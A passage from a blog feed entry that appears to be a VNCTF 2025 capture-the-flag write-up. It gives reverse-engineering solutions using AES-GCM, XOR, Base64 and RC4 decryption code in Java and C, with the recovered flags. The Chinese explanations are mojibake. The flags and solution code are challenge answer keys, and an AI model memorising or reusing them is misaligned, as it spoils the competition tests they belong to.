class="number">0x5b</span>,<span class="number">0x45</span>,<span class="number">0xa5</span>,<span class="number">0x5d</span>,<span class="number">0x46</span>,<span class="number">0x25</span>,<span class="number">0xc5</span>,<span class="number">0xad</span>,<span class="number">0x29</span>,<span class="number">0xfa</span>,<span class="number">0x11</span>,<span class="number">0xc4</span>,<span class="number">0x0f</span>,<span class="number">0xcc</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">GCMParameterSpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GCMParameterSpec</span>(<span class="number">128</span>, IV.getBytes());</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] aas = <span class="keyword">new</span> <span class="title class_">byte</span>[Enc.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Enc.length; i++) &#123;</span><br><span class="line">            aas[i] = (<span class="type">byte</span>) Enc[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES_128/GCM/NoPadding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE,keySpec,spec);</span><br><span class="line">        cipher.updateAAD(AAdBytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] Original = cipher.doFinal(aas);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Original, java.nio.charset.StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{Y0U_@re_th3_Ma5t3r_0f_C0mp0s3}</strong></p><h3 id="æŠ½å¥–è½¬ç›˜"><a href="#æŠ½å¥–è½¬ç›˜" class="headerlink" title="æŠ½å¥–è½¬ç›˜"></a>æŠ½å¥–è½¬ç›˜</h3><p>jadxåˆ†æhapæ–‡ä»¶ä¸­çš„modules.abcæ–‡ä»¶</p><p><img src="/2025/02/12/VNCTF2025/zp1.png" alt="e2917f062e0a2de095ca14ce3b6c365e"></p><p>åœ¨MyPageä¸‹å‘ç°ä¸€æ®µå­—èŠ‚æ•°ç»„ã€‚</p><p><img src="/2025/02/12/VNCTF2025/zp2.png" alt="QQ_1739080781927"><img src="/2025/02/12/VNCTF2025/zp6.png" alt="QQ_1739080763900"></p><p>è·å–åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å­˜åˆ°lexenv_0_0ä¸­ï¼Œè¿›è¡Œäº†ä¸€æ¬¡forEachå¯¹æ¯ä¸ªå­—èŠ‚è¿›è¡Œäº†åŠ å¯†è®¡ç®—ã€‚ç„¶åå†è°ƒç”¨å‡½æ•°å¯¹æ¯”é‚£ä¸ªå­—èŠ‚æ•°ç»„ä¸è¢«åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œæ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ï¼Œè¿™è¾¹åº”è¯¥å°±æ˜¯æœ€åçš„ä¸€æ¬¡åŠ å¯†å’Œå¯¹æ¯”ã€‚å¯ä»¥å°†è¿™æ®µå­—èŠ‚æ•°ç»„è¿›è¡Œé€†å‘è®¡ç®—ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸²æ˜æ–‡ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123; <span class="number">101</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">69</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">83</span>, <span class="number">62</span>, <span class="number">111</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">53</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">127</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">93</span>, <span class="number">115</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">7</span>;</span><br><span class="line">EncFlag[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.44s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="comment">// aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå­—ç¬¦ä¸²åƒæ˜¯Base64åŠ å¯†ã€‚</p><p>å¯ä»¥çœ‹åˆ°hapæ–‡ä»¶ä¸‹æœ‰ä¸€ä¸ªlibhello.soã€‚jadxå…¨å±€æœç´¢å¯ä»¥çœ‹åˆ°æœ‰è°ƒç”¨libhelloé‡Œé¢çš„MyCryå‡½æ•°ï¼Œåº”è¯¥å°±æ˜¯åŠ å¯†å‡½æ•°ã€‚</p><p><img src="/2025/02/12/VNCTF2025/zp3.png" alt="QQ_1739081075481"></p><p>ä½¿ç”¨IDAè¿›è¡Œé€†å‘åˆ†ælibhello.soï¼Œé€šè¿‡å­—ç¬¦ä¸²æœæœMyCryæŸ¥æ‰¾äº¤å‰å¼•ç”¨æ‰¾åˆ°Callã€‚</p><p>å¯ä»¥çœ‹åˆ°ä»¥ä¸‹æµç¨‹å¾ˆæ¸…æ™°ï¼Œè·å–å­—ç¬¦ä¸²ï¼Œå°†å­—ç¬¦ä¸²è¿›è¡ŒRC4åŠ å¯†ï¼ˆå¯†é’¥ä¸ºâ€Take_it_easyâ€ï¼‰ï¼Œç„¶åå†è¿›è¡ŒBase64åŠ å¯†ï¼Œè¿™è¾¹åˆ¤æ–­äº†ä¸€ä¸ªå€¼æ˜¯å¦ç­‰äº40èµ°ä¸åŒåˆ†æ”¯ã€‚</p><p>RC4åŠ å¯†æµç¨‹æ²¡è¢«é­”æ”¹ï¼Œå°±æœ€åå°†åŠ å¯†æ•°æ®å¤šå¼‚æˆ–äº†ä¸€ä¸ªå€¼ï¼Œä¸¤ä¸ªåˆ†æ”¯åˆ†åˆ«æ˜¯å¼‚æˆ–ä¸Šäº†40å’Œ24ã€‚å°è¯•åå‘ç°40å¯ä»¥è§£å¯†å‡ºæ˜æ–‡ã€‚</p><p>å°†ä¹‹å‰è§£å¯†åˆ°çš„Base64å­—ä¸²è¿›è¡Œdecodeç„¶åRC4è§£å¯†å³å¯ã€‚</p><p><img src="/2025/02/12/VNCTF2025/zp4.png" alt="QQ_1739081335258"></p><p><img src="/2025/02/12/VNCTF2025/zp5.png" alt="QQ_1739081364253"></p><p>è§£å¯†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">s[i] = i;</span><br><span class="line">k[i] = key[i % Len_k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Data, <span class="type">unsigned</span> <span class="type">long</span> Len_D, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">rc4_init</span>(s, key, Len_k);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len_D; k++) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">Data[k] = Data[k] ^ s[t];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Cyberchef Base64 Decode(&quot;aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs&quot;)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;<span class="number">0x68</span>,<span class="number">0xB2</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x9A</span>,<span class="number">0x8E</span>,<span class="number">0xFC</span>,<span class="number">0x0A</span>,<span class="number">0x41</span>,<span class="number">0xA4</span>,<span class="number">0x0F</span>,<span class="number">0xC2</span>,<span class="number">0xF5</span>,<span class="number">0x2F</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,<span class="number">0x8B</span>,<span class="number">0x1A</span>,<span class="number">0xD4</span>,<span class="number">0xC4</span>,<span class="number">0x83</span>,<span class="number">0x06</span>,<span class="number">0xD8</span>,<span class="number">0xA3</span>,<span class="number">0x28</span>,<span class="number">0x37</span>,<span class="number">0xAA</span>,<span class="number">0x63</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x2C</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] ^= <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;Take_it_easy&quot;</span>;</span><br><span class="line"><span class="built_in">rc4_crypt</span>(EncFlag, <span class="number">33</span>, Key, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] -= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.33s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{JUst_$ne_Iast_dance_2025!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-2025-WP&quot;&gt;&lt;a href=&quot;#VNCTF-2025-WP&quot; class=&quot;headerlink&quot; title=&quot;VNCTF 2025 WP&quot;&gt;&lt;/a&gt;VNCTF 2025 WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot;</summary>
      
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
